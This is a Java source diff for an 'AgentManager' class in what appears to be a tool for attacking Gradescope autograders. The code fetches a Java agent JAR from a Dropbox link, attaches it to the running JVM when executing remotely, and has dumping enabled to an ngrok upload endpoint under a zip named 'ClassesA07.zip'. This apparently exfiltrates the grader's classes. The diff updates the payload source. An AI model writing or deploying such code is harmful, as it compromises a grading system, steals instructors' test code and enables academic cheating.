@@ -18,10 +18,12 @@ public class AgentManager {
   public static String AGENT_LOCAL_SRC =
       "/home/user/IdeaProjects/GradescopeInspector2/GradescopeAgent/build/libs/GradescopeAgent-1.1.jar";
   public static String TMP_DIR = "/tmp/javaroot/";
+
+  public static String AGENT_JAR = "GradescopeAgent-1.1.jar";
   public static String AGENT_ARGS = "";
   private static Integer instantiationCount = 0;
   private final String agentRemoteSrc =
-      "https://dl.dropbox.com/s/zq5ghvatmiq3feq/GradescopeAgent-1.0-SNAPSHOT.jar?dl=0";
+      "https://www.dropbox.com/scl/fi/vmhs5fvh4zqxs416cp0e3/GradescopeAgent-1.1.jar?rlkey=ttdp3ufxawmr7lqslwnbesx9b&dl=1";
   private final String dumpDest = "https://f0e9-152-2-31-194.ngrok-free.app/upload";
   private final String zipName = "ClassesA07.zip";
   private boolean enableDump = true;
@@ -48,6 +50,10 @@ public class AgentManager {
     }
   }
 
+  public AgentManager() {
+
+  }
+
   public void run() {
 
     instantiationCount++;
@@ -68,7 +74,7 @@ public class AgentManager {
             website = new URL(agentRemoteSrc);
             ReadableByteChannel rbc = Channels.newChannel(website.openStream());
             FileOutputStream fos =
-                new FileOutputStream(TMP_DIR + "TestJavaAgent_1_0_SNAPSHOT.jar");
+                new FileOutputStream(TMP_DIR + AGENT_JAR);
             fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
           }
         } catch (Exception e) {
@@ -78,7 +84,7 @@ public class AgentManager {
 
       if (MagicManager.isRemote()) {
 
-        MagicManager.attachAgentToVM(TMP_DIR + "TestJavaAgent_1_0_SNAPSHOT.jar",
+        MagicManager.attachAgentToVM(TMP_DIR + AGENT_JAR,
             AGENT_ARGS);
       } else {
         MagicManager.attachAgentToVM(AGENT_LOCAL_SRC, AGENT_ARGS);
